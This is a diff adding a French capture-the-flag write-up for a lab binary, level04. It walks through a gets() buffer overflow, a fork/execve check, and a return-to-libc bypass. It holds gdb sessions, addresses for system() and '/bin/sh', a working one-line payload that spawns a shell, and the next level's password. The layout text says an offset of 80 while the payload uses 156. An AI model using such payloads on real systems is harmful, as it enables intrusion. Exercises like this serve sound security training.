@@ -105,3 +105,51 @@ End of assembler dump.
 
 # Exploit
 
+Le programme crée un child process avec un fork() qui exécute un peu plus loin un appel à gets() sur l'input que nous contrôlons (donc vulnérable à un buffer overflow), puis return.
+
+Le parent quant à lui boucle en suivant l'exécution du child, tant qu'il ne lance pas le syscall [11: execve()](https://redirect.cs.umbc.edu/courses/undergraduate/313/spring04/burt_katz/lectures/Lect07/syscall_offline.html):
+Attend un changement de statut de l'enfant, s'il a été interrompu ou a quitté (cf. [waitstatus.h](https://github.com/lattera/glibc/blob/master/bits/waitstatus.h)), affiche "child is exiting..." et return(0); 
+
+En sortie de boucle (l'enfant a tenté un execve()), il affiche "no exec() for you", le kill et retun(0);
+
+La stack est exécutable, mais le check sur execve() nous empêche de lancer un shellcode classique donc on va opter pour la même approche que dans le level01: un [retour a la libc](https://beta.hackndo.com/retour-a-la-libc/).
+
+Pour trouver l'offset on va devoir spécifier à gdb de suivre l'exécution du process enfant et se servir comme d'habitude du [générateur de pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
+
+`gdb level04`
+`set follow-fork-mode child`
+`r`
+```
+Starting program: /home/users/level04/level04
+[New process 3213]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 3213]
+0x41326641 in ?? ()
+```
+- Le générateur de pattern nous indique un offset de 156 pour la valeur 0x41326641
+
+Notre exploit sera composé comme suit: [ Offset de 80 (NopSled) ] [ Adresse system() ] [ Adresse retour (osef) ] [ Adresse "/bin/sh" ].
+
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+```
+- L'adresse de system() est 0xf7e6aed0 (\xd0\xae\xe6\xf7)
+
+```
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+```
+- L'adresse de "/bin/sh" est 0xf7f897ec (\xec\x97\xf8\xf7)
+
+`(python -c 'print "\x90" * 156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"'; cat - ) | ./level04`
+```
+Give me some shellcode, k
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
